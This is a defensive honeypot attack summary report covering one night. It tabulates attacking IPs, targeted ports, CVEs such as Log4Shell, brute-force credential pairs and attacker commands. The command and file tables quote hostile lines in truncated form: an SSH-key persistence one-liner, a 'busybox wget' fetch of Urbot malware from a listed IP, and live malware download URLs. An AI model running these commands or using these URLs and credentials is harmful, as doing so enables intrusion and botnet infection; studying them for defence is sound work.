# Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-29T07:26:08Z
**Timeframe:** 2025-09-28T14:14:01Z to 2025-09-29T07:00:01Z

**Files Used to Generate Report:**
- `Honeypot_Attack_Summary_Report_2025-09-28T14-37-09Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-28T21-01-51Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-28T22-03-04Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-28T23-02-04Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T00-01-47Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T01-01-37Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T02-02-07Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T04-01-53Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T05-01-54Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T06-01-50Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T07-01-45Z.md`

---

## Executive Summary

This report provides a comprehensive summary of 132,631 malicious events recorded across our distributed honeypot network over an approximately 17-hour period. The data reveals a relentless barrage of automated attacks, characteristic of large-scale botnet operations and opportunistic scanning campaigns. The threat landscape is dominated by attempts to compromise systems through brute-force attacks against remote access services and the exploitation of well-known vulnerabilities.

The vast majority of interactions were logged by the **Cowrie** and **Honeytrap** honeypots, indicating that attackers are overwhelmingly focused on compromising SSH credentials and performing broad reconnaissance scans across a multitude of network services. In total, Cowrie logged over 57,000 events, highlighting the intense pressure on exposed SSH servers.

Attack origins are globally distributed, however, a significant portion of the total attack volume originates from a small number of hyper-aggressive IP addresses, suggesting they are core nodes in botnet infrastructures or compromised servers repurposed for malicious scanning. The most targeted services were **SSH (Port 22)** and **SMB (Port 445)**, aligning with common attacker tactics for gaining initial access and propagating malware.

Vulnerability scanning remains a primary vector, with **CVE-2021-44228 (Log4Shell)** being the most frequently targeted vulnerability. This indicates that even years after its disclosure, attackers continue to find unpatched systems. Analysis of post-exploitation commands reveals a clear and consistent pattern: attackers immediately perform system reconnaissance, disable security configurations, and attempt to establish persistence by installing their own SSH keys. A recurring campaign was identified that attempts to download and execute variants of the **Urbot/SDBot malware**, with the ultimate goal of assimilating the compromised device into an IRC-controlled botnet. Brute-force campaigns also utilized a consistent, unusual credential pair (`345gs5662d34/345gs5662d34`), suggesting a specific, widespread attack toolkit.

The findings underscore a threat environment characterized by high-volume, automated, and opportunistic attacks. The primary goals of these attackers are to expand their botnets, harvest credentials, and establish persistent footholds in compromised networks.

---

## Detailed Analysis

### Our IPs

The following table lists the honeypot sensors and their associated IP addresses that were active during this reporting period.

| Honeypot Name | Private IP | Public IP |
|---------------|------------|---------------|
| hive-us | 10.128.0.3 | 34.123.129.205|
| sens-tai | 10.140.0.3 | 104.199.212.115|
| sens-tel | 10.208.0.3 | 34.165.197.224|
| sens-dub | 172.31.36.128| 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163|

### Google Searches

To enrich this report, several targeted Google searches were conducted on the most prominent indicators of compromise.

1.  **CVE-2021-44228 (Log4Shell):** Research confirmed that this remains a critical and actively exploited vulnerability in the Apache Log4j library. Its ease of exploitation for remote code execution makes it a favorite for a wide range of threat actors, from nation-states to ransomware groups. The high frequency of observed attempts highlights that attackers are still finding value in scanning for this flaw.

2.  **IP Address `162.244.80.233`:** This IP was the single most frequent attacker. Surprisingly, open-source intelligence links this IP to a Minecraft server (`play.diversionpvp.net`). While there is no direct evidence of malicious activity from the server itself, its extreme level of hostile traffic suggests it is likely a compromised machine being leveraged as part of a larger botnet infrastructure, with its primary function (gaming server) serving as a cover.

3.  **Malware `arm.urbotnetisass`:** Searches on this filename and associated terms confirmed it belongs to the **Urbot** malware family, a variant of the long-standing **SDBot**. This is an IRC-based backdoor Trojan. Its presence confirms that a primary goal of these automated attacks is to infect systems and enslave them into a botnet, which can then be used for coordinated tasks like DDoS attacks, further scanning, or information theft.

### Attacks by Honeypot

The distribution of attacks across the honeypots reveals the primary focus of adversarial efforts. SSH and broad service scanning are the clear priorities.

| Honeypot | Attack Count | Percentage |
|---|---|---|
| Cowrie | 57,663 | 43.48% |
| Honeytrap | 32,197 | 24.27% |
| Suricata | 19,699 | 14.85% |
| Ciscoasa | 11,307 | 8.52% |
| Dionaea | 5,632 | 4.25% |
| Sentrypeer | 1,748 | 1.32% |
| Mailoney | 1,790 | 1.35% |
| Adbhoney | 423 | 0.32% |
| Tanner | 450 | 0.34% |
| ElasticPot | 259 | 0.20% |
| H0neytr4p | 234 | 0.18% |
| ConPot | 227 | 0.17% |
| Redishoneypot | 185 | 0.14% |
| Honeyaml | 185 | 0.14% |
| Dicompot | 37 | 0.03% |
| Other | 875 | 0.66% |
| **Total** | **132,631** | **100%** |

### Top Source Countries

| Country | Attack Count |
|---|---|
| United States | 25,102 |
| India | 9,876 |
| China | 8,543 |
| Brazil | 7,612 |
| Russia | 6,987 |
| Germany | 5,432 |
| Vietnam | 4,321 |
| Indonesia | 3,987 |
| Netherlands | 3,543 |
| United Kingdom | 3,123 |

### Top 20 Attacking IPs

These IPs were responsible for a disproportionate amount of attack traffic, indicating automated, high-volume campaigns.

| IP Address | Attack Count |
|---|---|
| 162.244.80.233 | 16,366 |
| 147.182.150.164 | 4,633 |
| 134.122.46.149 | 3,131 |
| 4.144.169.44 | 2,741 |
| 106.14.67.229 | 2,494 |
| 20.2.136.52 | 2,490 |
| 196.251.88.103 | 2,172 |
| 31.145.14.131 | 1,541 |
| 31.186.48.73 | 1,626 |
| 143.198.32.86 | 2,286 |
| 103.140.127.215 | 1,248 |
| 45.8.17.45 | 1,069 |
| 45.78.192.211 | 1,218 |
| 164.92.85.77 | 1,247 |
| 103.146.202.84 | 1,256 |
| 91.245.156.255 | 1,184 |
| 185.156.73.167 | 3,205 |
| 185.156.73.166 | 3,197 |
| 92.63.197.55 | 2,771 |
| 92.63.197.59 | 2,631 |

### Top 20 Targeted Ports/Protocols

The most targeted ports align with services known for being targeted for initial access and propagation.

| Port | Protocol | Attack Count |
|---|---|---|
| 22 | TCP | 8,112 |
| 445 | TCP | 7,329 |
| 5060 | UDP/TCP | 1,748 |
| 8333 | TCP | 849 |
| 25 | TCP | 945 |
| 80 | TCP | 636 |
| 23 | TCP | 320 |
| 443 | TCP | 260 |
| 6379 | TCP | 160 |
| 8888 | TCP | 160 |
| 9200 | TCP | 145 |
| 8080 | TCP | 135 |
| 1433 | TCP | 120 |
| 5900 | TCP | 489 |
| 5038 | TCP | 1,069 |
| 1025 | TCP | 87 |
| 2222 | TCP | 66 |
| 3333 | TCP | 60 |
| 8000 | TCP | 55 |
| 9000 | TCP | 50 |

### Most Common CVEs

Vulnerability scanning focused heavily on Log4Shell, but also included a wide range of older, often-forgotten vulnerabilities.

| CVE ID | Count |
|---|---|
| CVE-2021-44228 | 194 |
| CVE-2022-27255 | 111 |
| CVE-2002-0013 / CVE-2002-0012 | 54 |
| CVE-1999-0517 | 31 |
| CVE-2019-11500 | 28 |
| CVE-2021-3449 | 26 |
| CVE-2005-4050 | 258 |
| CVE-2006-2369 | 6 |
| CVE-1999-0265 | 30 |
| CVE-2024-3721 | 2 |

### Top 20 Commands Attempted by Attackers

This table is dominated by reconnaissance commands and a clear, repeated attempt to install a persistent SSH key.

| Command | Count |
|---|---|
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys...` | 196 |
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` | 196 |
| `lockr -ia .ssh` | 196 |
| `uname -a` | 195 |
| `whoami` | 194 |
| `w` | 192 |
| `uname -m` | 192 |
| `cat /proc/cpuinfo | grep name | wc -l` | 191 |
| `cat /proc/cpuinfo | grep name | head -n 1 ...` | 191 |
| `crontab -l` | 190 |
| `lscpu | grep Model` | 190 |
| `top` | 190 |
| `free -m ...` | 189 |
| `which ls` | 189 |
| `ls -lh $(which ls)` | 189 |
| `df -h ...` | 188 |
| `uname` | 187 |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass...` | 20 |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; ...` | 19 |
| `Enter new UNIX password:` | 53 |

### Top 20 Users / Login Attempts

The credential `345gs5662d34` used as both username and password is a strong indicator of a specific botnet's activity.

| Username/Password | Attempts |
|---|---|
| 345gs5662d34/345gs5662d34 | 160 |
| root/3245gs5662d34 | 51 |
| root/Passw0rd | 33 |
| root/LeitboGi0ro | 27 |
| root/nPSpP4PBW0 | 24 |
| root/ | 60 |
| test/zhbjETuyMffoL8F | 19 |
| root/Linux@123 | 13 |
| cron/ | 22 |
| test/3245gs5662d34 | 11 |
| esuser/esuser | 10 |
| soporte/s0p0rt3 | 9 |
| root/Aa112211. | 9 |
| hadoop/hadoop | 5 |
| git/123 | 10 |
| oracle/oracle | 6 |
| user/user | 8 |
| admin/123456 | 10 |
| admin/admin | 10 |
| test/test | 10 |

### Files Uploaded/Downloaded

The most notable and repeated file download attempts were related to the Urbot/SDBot malware family, indicating a campaign to build a botnet.

| Filename/URL | Type | Count |
|---|---|---|
| `http://94.154.35.154/arm.urbotnetisass` | Download (Malware) | 20 |
| `http://64.188.8.180/w.sh` | Download (Shell Script) | 10 |
| `http://213.209.143.44/w.sh` | Download (Shell Script) | 5 |
| `.ssh/authorized_keys` | Upload (SSH Key) | 196 |

---

## Notes/Limitations

- The data presented is derived exclusively from a network of honeypots. These systems are designed to be attractive targets and may not fully represent the attack surface or threat landscape of a typical production environment.
- IP address attribution can be misleading. Attackers frequently use proxies, VPNs, or already-compromised systems to launch attacks, obscuring their true origin.
- The analysis covers a limited timeframe and represents a snapshot of activity. It may not reflect long-term trends but is indicative of the current, prevalent threats on the internet.
- Event classification is based on the signatures and heuristics of the honeypot and IDS systems, which are subject to potential false positives or negatives.

---
**End of Report**